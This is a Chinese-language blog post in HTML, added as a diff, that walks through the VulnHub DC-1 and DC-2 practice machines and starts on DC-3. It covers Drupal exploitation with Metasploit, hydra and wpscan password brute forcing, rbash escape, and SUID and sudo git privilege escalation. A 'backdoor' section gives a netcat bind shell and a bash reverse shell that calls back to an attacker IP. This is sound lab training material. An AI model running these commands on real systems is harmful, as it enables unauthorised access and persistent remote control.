@@ -1,0 +1,341 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.7.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.7.0" type="image/png" sizes="32x32"><meta name="description" content="挺久没有玩渗透了，这次便通过DC靶机来熟悉一下简单的渗透流程吧">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub:DC-1~3">
+<meta property="og:url" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/index.html">
+<meta property="og:site_name" content="hey&#39;s blog">
+<meta property="og:description" content="挺久没有玩渗透了，这次便通过DC靶机来熟悉一下简单的渗透流程吧">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/1.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/2.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/3.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/4.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/5.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/6.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/7.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/8.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/9.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/10.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/11.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/12.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/13.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/14.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/15.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/16.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/17.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/18.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/19.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/20.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/21.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/22.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/23.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/24.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/27.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/26.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/28.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/29.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/30.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/1.jpg">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/31.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/32.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/33.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/52.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/35.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/38.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/39.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/40.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/41.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/42.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/43.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/44.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/45.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/46.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/47.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/48.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/49.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/50.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/51.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/53.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/54.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/55.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/56.png">
+<meta property="og:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/57.png">
+<meta property="article:published_time" content="2023-08-03T08:41:58.000Z">
+<meta property="article:modified_time" content="2023-08-10T23:51:02.011Z">
+<meta property="article:author" content="hey">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/1.png"><title>VulnHub:DC-1~3 | hey's blog</title><link ref="canonical" href="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.7.0"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: true,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">About</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/read/"><span class="header-nav-menu-item__icon"><i class="fas fa-book"></i></span><span class="header-nav-menu-item__text">menu.read</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">hey's blog</div><div class="header-banner-info__subtitle">天气转晴太阳崭新我在前进</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">VulnHub:DC-1~3</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-08-03</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-08-11</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">Visited</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
+        <h1 id="DC-1">
+          <a href="#DC-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1>
+      
+        <h2 id="信息收集">
+          <a href="#信息收集" class="heading-link"><i class="fas fa-link"></i></a><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2>
+      
+        <h3 id="资产扫描">
+          <a href="#资产扫描" class="heading-link"><i class="fas fa-link"></i></a><a href="#资产扫描" class="headerlink" title="资产扫描"></a>资产扫描</h3>
+      <p>此时先使用fscan对其进行一个C段的扫描看这个IP有什么资产<br><img src="/2023/08/03/VulnHub-DC-1/1.png"><br>此时发现了三处的资产和其开放的端口；此时到端口号22想到ssh远程连接，端口号80想到web网页攻击。</p>
+
+        <h3 id="漏洞发现">
+          <a href="#漏洞发现" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3>
+      <p>此时继续对这些资产进行扫描，依旧是使用fscan;此时发现其识别出了CMS和其相关的poc<br><img src="/2023/08/03/VulnHub-DC-1/2.png"></p>
+
+        <h2 id="漏洞利用">
+          <a href="#漏洞利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2>
+      <p>看到poc被识别出来之后我们直接使用msf进行攻击<br><img src="/2023/08/03/VulnHub-DC-1/3.png"><br>此时我们利用第一个远程代码执行漏洞进行尝试<br><img src="/2023/08/03/VulnHub-DC-1/4.png"><br>此时可以使用命令info进行查看我们需要设置的选项；此时我们只需要将RHOSTS设置为目标ip即可进行利用；但是此时发现这个漏洞无法建立session并且无法利用漏洞攻击神奇metasploit进行攻击。所以此时我们换一个漏洞进行利用；此时发现攻击机与目标已经建立了session了；并且我们命令执行成功，<br><img src="/2023/08/03/VulnHub-DC-1/5.png"><br>因为此时不是交互式的shell所以此时我们考虑建立一个交互式的shell；利用python进行反弹shell</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></div></figure>
+<p>此时也是成功拿下第一个flag<br><img src="/2023/08/03/VulnHub-DC-1/6.png"><br>flag1{Every good CMS needs a config file - and so do you.}<br>此时告诉我们每一个好的CMS都会需要配置文件，此时我们可以去寻找Durpal的配置文件；此时我们通过百度搜索发现durpal的配置文件默认为：sites&#x2F;default&#x2F;settings.php；此时我们使用命令进行查找</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;*settings*&quot;</span><br></pre></td></tr></table></div></figure>
+<p><img src="/2023/08/03/VulnHub-DC-1/7.png"><br>此时也是成功的获得flag2{Brute force and dictionary attacks aren’t the,only ways to gain access (and you WILL need access). Wha<br>t can you do with these credentials?}</p>
+
+        <h2 id="数据库账密泄露">
+          <a href="#数据库账密泄露" class="heading-link"><i class="fas fa-link"></i></a><a href="#数据库账密泄露" class="headerlink" title="数据库账密泄露"></a>数据库账密泄露</h2>
+      <p>此时我们还发现了该数据库的账密泄露了出来，所以此时我们考虑进入数据库看看有什么发现<br><img src="/2023/08/03/VulnHub-DC-1/8.png"><br>此时经查找我们找到了两个用户的账号和密码；但是此时的密码是经过加密的<br><img src="/2023/08/03/VulnHub-DC-1/9.png"><br>那么此时我们可以找一下这个网站下面是否存在相关加密的代码<br>此时通过find命令进行模糊查找关键词”encode”或则”psaaword”;最终在找了一个&#x2F;var&#x2F;www&#x2F;scripts&#x2F;password-hash.sh；此时我们打开之后发现是一p<br>hp代码；此时通过chatgpt的翻译发现这个可以用来生成加密之后的密码；那么此时我们就可以进行更改密码的操作<br><img src="/2023/08/03/VulnHub-DC-1/10.png"><br>此时已经更改成功；此时我们也顺利找到了flag3{Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.}<br><img src="/2023/08/03/VulnHub-DC-1/11.png"></p>
+
+        <h2 id="ssh的爆破">
+          <a href="#ssh的爆破" class="heading-link"><i class="fas fa-link"></i></a><a href="#ssh的爆破" class="headerlink" title="ssh的爆破"></a>ssh的爆破</h2>
+      <p>此时提示我们需要passwd和-exec还有shadow<br><img src="/2023/08/03/VulnHub-DC-1/12.png"><br>&#x2F;etc&#x2F;shadow无法查看，权限不够，查看etc&#x2F;passwd，发现目标靶机用户flag4,并且有&#x2F;bin&#x2F;bash，看到这想到了还有端口22，所以ssh连接。但是密码不<br>知道所以只能用爆破神器hydra。(其实flag4是在flag4这个系统用户目录下面的，我们可以试试拿到flag4这个用户的账户)</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -l flag4 -P /usr/share/john/password.lst ssh://192.168.78.147</span><br><span class="line">此时爆破的密码本默认使用kali下自带的密码本</span><br></pre></td></tr></table></div></figure>
+<p>此时成功爆破出密码<br><img src="/2023/08/03/VulnHub-DC-1/13.png"><br>此时也成功的拿到flag4{Can you use this same method to find or access the flag in root?Probably. But perhaps it’s not that easy.  Or maybe it is?}<br><img src="/2023/08/03/VulnHub-DC-1/14.png"></p>
+
+        <h2 id="SUID提权">
+          <a href="#SUID提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h2>
+      <p>SUID是set uid的简称，它出现在文件所属主权限的执行位上面，标志为 s 。当设置了SUID后，UMSK第一位为4。我们知道，我们账户的密码文件存放在&#x2F;etc&#x2F;shadow中，而&#x2F;etc&#x2F;shadow的权限为 ———-。也就是说：只有root用户可以对该目录进行操作，而其他用户连查看的权限都没有。当普通用户要修改自己的密码的时候，可以使用passwd这个指令。passwd这个指令在&#x2F;bin&#x2F;passwd下，当我们执行这个命令后，就可以修改&#x2F;etc&#x2F;shadow下的密码了。那么为什么我们可以通过passwd这个指令去修改一个我们没有权限的文件呢？这里就用到了suid，suid的作用是让执行该命令的用户以该命令拥有者即root的权限去执行，意思是当普通用户执行passwd时会拥有root的权限，这样就可以修改&#x2F;etc&#x2F;passwd这个文件了。<br>此时提示我们需要root权限，所以此时我们进行一个提权；此时我们通过find命令查看拥有特殊权限suid的命令</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000</span><br></pre></td></tr></table></div></figure>
+<p>此时发现find具有root权限。(哪些可以进行提权可以在网上查，提权用法可以临时查)；直接执行命令”find -exec &#x2F;bin&#x2F;sh ;“进行提权<br>flag5{Well done!!!!Hopefully you’ve enjoyed this and learned some new skills.}<br><img src="/2023/08/03/VulnHub-DC-1/15.png"></p>
+
+        <h1 id="DC-2">
+          <a href="#DC-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1>
+      
+        <h2 id="信息收集-1">
+          <a href="#信息收集-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2>
+      
+        <h3 id="资产扫描-1">
+          <a href="#资产扫描-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#资产扫描-1" class="headerlink" title="资产扫描"></a>资产扫描</h3>
+      <p>此时发现一个301重定向的资产<br><img src="/2023/08/03/VulnHub-DC-1/16.png"><br>此时可以在继续的进一步扫描一下它的端口看看其开放了什么业务；此时可以看到其开放了80和7744端口<br><img src="/2023/08/03/VulnHub-DC-1/17.png"><br>此时因为存在301重定向的问题我们输入的ip变成了域名；所以此时怀疑存在域名重定向；我们可以修改主机的hosts文件，其作用是主机名到ip地址的映射，他的优先级比DNS高。<br>windows:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></div></figure>
+<p>linux:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></div></figure>
+<p>此时再次打开就可以发现flag1{Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.More passwords is always better, but sometimes you just can’t win them all.Log in as one to see the next flag.If you can’t find it, log in as another.}<br>提示用cewl来获取密码，所有应该是爆破密码之类的，且提示自己的密码字典可能无效，且有时没法获得所有密码，提示用其他的身份去登录</p>
+
+        <h3 id="目录扫描">
+          <a href="#目录扫描" class="heading-link"><i class="fas fa-link"></i></a><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3>
+      <p><img src="/2023/08/03/VulnHub-DC-1/18.png"><br>此时成功扫描出登入界面<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://dc-2/wp-admin%EF%BC%9B%E7%84%B6%E5%90%8E%E6%A0%B9%E6%8D%AEflag1%E7%9A%84%E6%8F%90%E7%A4%BA%E6%88%91%E4%BB%AC%E6%AD%A4%E6%97%B6%E5%BA%94%E8%AF%A5%E6%98%AF%E8%A6%81%E4%BD%BF%E7%94%A8cewl%E8%BF%9B%E8%A1%8C%E6%89%AB%E6%8F%8F%E7%84%B6%E5%90%8E%E7%94%9F%E6%88%90%E5%AD%97%E5%85%B8">http://dc-2/wp-admin；然后根据flag1的提示我们此时应该是要使用cewl进行扫描然后生成字典</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>(cewl是通过爬行网站关键信<br>息创建一个密码字典)</p>
+
+        <h3 id="框架识别">
+          <a href="#框架识别" class="heading-link"><i class="fas fa-link"></i></a><a href="#框架识别" class="headerlink" title="框架识别"></a>框架识别</h3>
+      <p><img src="/2023/08/03/VulnHub-DC-1/19.png"><br>此时发现是wordpress的框架；所以此时可以尝试使用kali自带的WPScan<br>WPScan:<br>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。<br>该扫描器可以实现获取站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。同时还可以实现对未加防护的Wordpress站点暴力破解用户名密码<br>此时使用命令爆破出wordpress框架下的用户</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 --enumerate u</span><br></pre></td></tr></table></div></figure>
+<p><img src="/2023/08/03/VulnHub-DC-1/20.png"><br>接下来我们就可以使用cewl进行爬行网站关键词来创建一个字典</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2/ -w dc2.txt</span><br><span class="line">cewl url -m 9 //生成长度至少为9的密码</span><br><span class="line">cewl url -n -e //从网站中获取email</span><br><span class="line">cewl url -c //计算网站字典中重复的单词数量</span><br><span class="line">cewl url -d 3 //增加爬虫的爬取深度以生成更大的字典文件</span><br></pre></td></tr></table></div></figure>
+<p>此时根据生成的密码本和之前得到的用户名我们继续使用wpscan进行一个爆破密码</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -U &#x27;/home/hey/桌面/usdc2.txt&#x27;  -P &#x27;/home/hey/桌面/dc2.txt&#x27;</span><br></pre></td></tr></table></div></figure>
+<p><img src="/2023/08/03/VulnHub-DC-1/21.png"><br>此时在登入之后也是获得flag2{If you can’t exploit WordPress and take a shortcut, there is another way.Hope you found another entry point.}<br><img src="/2023/08/03/VulnHub-DC-1/22.png"></p>
+
+        <h2 id="7744端口的ssh">
+          <a href="#7744端口的ssh" class="heading-link"><i class="fas fa-link"></i></a><a href="#7744端口的ssh" class="headerlink" title="7744端口的ssh"></a>7744端口的ssh</h2>
+      <p>提示无法利用wordpress采取捷径，尝试令一种方法，之前nmap扫描出了7744端口，那么我们是不是可以尝试ssh登录<br><img src="/2023/08/03/VulnHub-DC-1/23.png"></p>
+
+        <h2 id="Linux-Restricted-Shell绕过技巧总结">
+          <a href="#Linux-Restricted-Shell绕过技巧总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#Linux-Restricted-Shell绕过技巧总结" class="headerlink" title="Linux Restricted Shell绕过技巧总结"></a>Linux Restricted Shell绕过技巧总结</h2>
+      <p>Restricted Shell既受限的shell，它与一般标准shell的区别在于会限制执行一些行为<br>此时经过测试发现vi可以使用<br><img src="/2023/08/03/VulnHub-DC-1/24.png"><br>此时除了一个个的测试还可以使用命令来看看有哪些命令可以使用</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">echo /home/tom/usr/bin/*</span><br></pre></td></tr></table></div></figure>
+<p><img src="/2023/08/03/VulnHub-DC-1/27.png"></p>
+
+        <h3 id="绕过rbash">
+          <a href="#绕过rbash" class="heading-link"><i class="fas fa-link"></i></a><a href="#绕过rbash" class="headerlink" title="绕过rbash"></a>绕过rbash</h3>
+      
+        <h4 id="法一">
+          <a href="#法一" class="heading-link"><i class="fas fa-link"></i></a><a href="#法一" class="headerlink" title="法一"></a>法一</h4>
+      <p>此时写入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi test</span><br><span class="line">set shell=bin/sh</span><br><span class="line">shell</span><br><span class="line">shell 通常指的是命令行解释器，它是一种用于执行用户输入的命令的程序。它允许用户与操作系统进行交互，运行各种命令、脚本和程序。</span><br></pre></td></tr></table></div></figure>
+<p>我们就可以拿到一个交互式shell，成功进行rbash逃逸；但是此时我们的命令还是用不了，但是此时的报错便变成了<code>/bin/sh: 3: cat: not found</code>;此时的报错是命令执行路径异常的问题<br><img src="/2023/08/03/VulnHub-DC-1/26.png"><br>此时我们输入echo $PATH来验证我们命令的路径；此时显示<code>/home/tom/usr/bin</code>;此时我们可以对我们的路径重新赋值</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export PATH=&quot;/usr/sbin:/usr/bin:/rbin:/bin&quot;</span><br><span class="line">export的意思是把变量输出为全局变量，后面那些路径是应用常见路径，路径之间使用：分割。</span><br></pre></td></tr></table></div></figure>
+<p><img src="/2023/08/03/VulnHub-DC-1/28.png"><br>或者此时也可以使用<code>export -p</code>来查看所有路径<br>flag3{Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.}</p>
+
+        <h4 id="法二">
+          <a href="#法二" class="heading-link"><i class="fas fa-link"></i></a><a href="#法二" class="headerlink" title="法二"></a>法二</h4>
+      <p>此时直接利用bash_cmds来自定义一个shell</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[shell]=/bin/sh;shell</span><br></pre></td></tr></table></div></figure>
+<p>然后此时为这个shell添加环境变量</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="切换用户jerry">
+          <a href="#切换用户jerry" class="heading-link"><i class="fas fa-link"></i></a><a href="#切换用户jerry" class="headerlink" title="切换用户jerry"></a>切换用户jerry</h2>
+      <p>此时根据提示我们可以尝试切换一下用户为jerry<br><img src="/2023/08/03/VulnHub-DC-1/29.png"><br>flag4{Good to see that you’ve made it this far - but you’re not home yet. You still need to get the final flag (the only flag that really counts!!!).  No hints here - you’re on your own now.  :-)Go on - git outta here!!!!}</p>
+
+        <h2 id="git提权">
+          <a href="#git提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#git提权" class="headerlink" title="git提权"></a>git提权</h2>
+      <p>此时我们查看一下权限信息<code>sudo -l</code><br><img src="/2023/08/03/VulnHub-DC-1/30.png"><br>此时发现root用户可以执行git命令，且flag4也提示到了git；所以此时我们可以考虑使用git提权<br>此时可以百度查找git提权的方法<br><img src="/2023/08/03/VulnHub-DC-1/1.jpg"><br>此时输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p help config</span><br></pre></td></tr></table></div></figure>
+<p>来强制进入交互状态<br>接下来输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!/bin/bash</span><br></pre></td></tr></table></div></figure>
+<p>来打开一个用户为root的shell<br><img src="/2023/08/03/VulnHub-DC-1/31.png"></p>
+
+        <h3 id="后门">
+          <a href="#后门" class="heading-link"><i class="fas fa-link"></i></a><a href="#后门" class="headerlink" title="后门"></a>后门</h3>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一种:nc -lvvp 9999 -t -e /bin/bash  </span><br><span class="line">nc瑞士军刀 -l本地监听 -vv详细信息 -p端口    开启本地端口发布出去</span><br><span class="line">windows可使用 nc.exe ip 9999链接linux</span><br><span class="line"></span><br><span class="line">第二种bash直接反弹</span><br><span class="line">1.bash -i &gt;&amp; /dev/tcp/192.168.17.71/8080 0&gt;&amp;1</span><br><span class="line">2.本地 nc -l -p 8080</span><br></pre></td></tr></table></div></figure>
+<p><img src="/2023/08/03/VulnHub-DC-1/32.png"></p>
+
+        <h1 id="DC-3">
+          <a href="#DC-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1>
+      
+        <h2 id="信息收集-2">
+          <a href="#信息收集-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h2>
+      
+        <h3 id="资产扫描-2">
+          <a href="#资产扫描-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#资产扫描-2" class="headerlink" title="资产扫描"></a>资产扫描</h3>
+      <p><img src="/2023/08/03/VulnHub-DC-1/33.png"><br>此时发现有一个资产被扫描出了nday</p>
+
+        <h3 id="CMS识别">
+          <a href="#CMS识别" class="heading-link"><i class="fas fa-link"></i></a><a href="#CMS识别" class="headerlink" title="CMS识别"></a>CMS识别</h3>
